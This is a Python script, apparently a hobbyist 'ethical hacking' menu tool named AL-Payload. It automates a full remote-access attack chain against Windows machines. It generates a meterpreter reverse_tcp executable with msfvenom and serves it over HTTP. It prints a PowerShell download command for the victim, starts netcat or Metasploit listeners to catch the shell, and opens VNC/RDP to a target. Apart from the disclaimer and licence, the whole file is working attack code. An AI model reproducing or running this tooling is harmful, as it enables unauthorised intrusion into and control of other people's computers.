#!/usr/bin/env python3
# -*- coding: utf-8 -*- 

"""
═══════════════════════════════════════════════════════════════════════════
  AL-Payload - Ethical Hacking Utility

  © 2025 AL-Payload | All rights reserved.

  This tool is developed solely for educational purposes and ethical testing.
  Do not use it for unauthorized or illegal activities.
  Usage is at your own risk.

  MIT License

  Permission is hereby granted, free of charge, to any person obtaining a
  copy of this software and associated documentation files (the "Software"),
  to deal in the Software without restriction, including without limitation
  the rights to use, copy, modify, merge, publish, distribute, sublicense,
  and/or sell copies of the Software, subject to the following conditions:

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
  OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
  FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
  IN THE SOFTWARE.
═══════════════════════════════════════════════════════════════════════════
"""

import os
import time
import subprocess
import sys
from pyfiglet import Figlet
from termcolor import colored
from colorama import init
from tqdm import tqdm
import requests

def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install():
    required_packages = ["pyfiglet", "termcolor", "colorama", "tqdm"]
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            print(f"Library {package} not found! Installing...")
            install_package(package)

def check_and_install_system_tools():
    required_system_tools = ["msfvenom", "netcat", "curl", "msfconsole"]
    for tool in required_system_tools:
        if os.system(f"which {tool} > /dev/null") != 0:
            print(f"{tool} not found! Installing...")
            os.system(f"sudo apt-get install {tool} -y")

check_and_install()
check_and_install_system_tools()

init()

def loading_bar():
    for _ in tqdm(range(50), desc=colored("Loading AL-Payload Tool", "cyan")):
        time.sleep(0.03)

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    clear()
    f = Figlet(font='slant')
    print(colored(f.renderText('AL-Payload Tool'), 'red'))
    print(colored("     Hacker Swiss Knife - Coded by NullSec8", 'yellow'))
    print(colored("     -------------------------------\n", 'cyan'))

def disclaimer_warning():
    print(colored("⚠️  DISCLAIMER ⚠️", 'red'))
    print(colored("This tool is only for educational purposes and testing on authorized systems!", 'yellow'))
    print(colored("Unauthorized use is the sole responsibility of the user.", 'yellow'))
    input(colored("\nPress Enter to continue if you agree...", 'cyan'))

def menu():
    print(colored("[1] Create Payload", 'green'))
    print(colored("[2] Start Listener", 'green'))
    print(colored("[3] Send Payload over the Network", 'green'))
    print(colored("[4] Remote Access", 'green'))
    print(colored("[5] Show Public/Private IP", 'green'))
    print(colored("[0] Exit\n", 'red'))

def get_public_ip():
    try:
        public_ip = requests.get('https://ifconfig.me').text
        print(f"[+] PUBLIC IP: {public_ip}")
        return public_ip
    except requests.exceptions.RequestException as e:
        print(f"[!] Cannot get public IP: {str(e)}")
        return None

def show_ip():
    print(colored("\n[+] PRIVATE IP:", 'yellow'))
    os.system("hostname -I")
    print(colored("[+] PUBLIC IP:", 'yellow'))
    get_public_ip()

def create_payload():
    lhost = input("LHOST: ")
    lport = input("LPORT: ")
    output = input("Save as: ")
    print(colored(f"\n[*] Creating Payload Windows: {output}...", 'green'))
    os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}")
    print(colored(f"[+] Windows Payload created successfully: {output}.exe", 'yellow'))

def send_payload():
    payload_path = input(colored("\nEnter payload path (.exe): ", 'cyan'))
    port = input(colored("Choose PORT for HTTP server (default 8000): ", 'cyan')) or "8000"
    print(colored("\n[*] Starting HTTP server...", 'green'))
    os.chdir(os.path.expanduser(os.path.dirname(payload_path)))
    os.system(f"gnome-terminal -- bash -c 'python3 -m http.server {port}; exec bash'")
    kali_ip = input(colored("Enter Kali Linux IP for download link: ", 'cyan'))
    print(colored("\n[+] PowerShell Command for target: ", 'yellow'))
    print(colored(f"powershell -Command \"Invoke-WebRequest -Uri http://{kali_ip}:{port}/{os.path.basename(payload_path)} -OutFile reverse_shell.exe\"", 'magenta'))

def start_listener():
    lport = input(colored("Choose LPORT for listener: ", 'cyan'))
    print(colored("\n[*] Starting Netcat Listener...", 'green'))
    os.system(f"gnome-terminal -- bash -c 'nc -lvnp {lport}; exec bash'")

def start_msfconsole_listener():
    lport = input(colored("Choose LPORT for listener: ", 'cyan'))
    print(colored("\n[*] Starting Listener with msfconsole...", 'green'))
    os.system(f"bash -c 'msfconsole -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT {lport}; run;\"'")

def remote_access():
    print(colored("\n[1] Start VNC Viewer", 'green'))
    print(colored("[2] Start Remote Desktop (Windows RDP)", 'green'))
    choice = input(colored("Choose an option: ", 'cyan'))
    if choice == '1':
        target_ip = input(colored("Enter target IP for VNC: ", 'cyan'))
        os.system(f"vncviewer {target_ip}")
    elif choice == '2':
        target_ip = input(colored("Enter target IP for RDP: ", 'cyan'))
        os.system(f"rdesktop {target_ip}")
    else:
        print(colored("Invalid choice!", 'red'))

def main():
    banner()
    disclaimer_warning()
    loading_bar()

    while True:
        menu()
        choice = input(colored("Choose an option: ", 'cyan'))

        if choice == '1':
            create_payload()
        elif choice == '2':
            choice_listener = input(colored("Choose option: \n[1] Netcat\n[2] Msfconsole\n", 'cyan'))
            if choice_listener == '1':
                start_listener()
            elif choice_listener == '2':
                start_msfconsole_listener()
            else:
                print(colored("Invalid choice!", 'red'))
        elif choice == '3':
            send_payload()
        elif choice == '4':
            remote_access()
        elif choice == '5':
            show_ip()
        elif choice == '0':
            break
        else:
            print(colored("Invalid choice!", 'red'))

        input(colored("\nPress Enter to continue...", 'cyan'))
        banner()

if __name__ == "__main__":
    main()
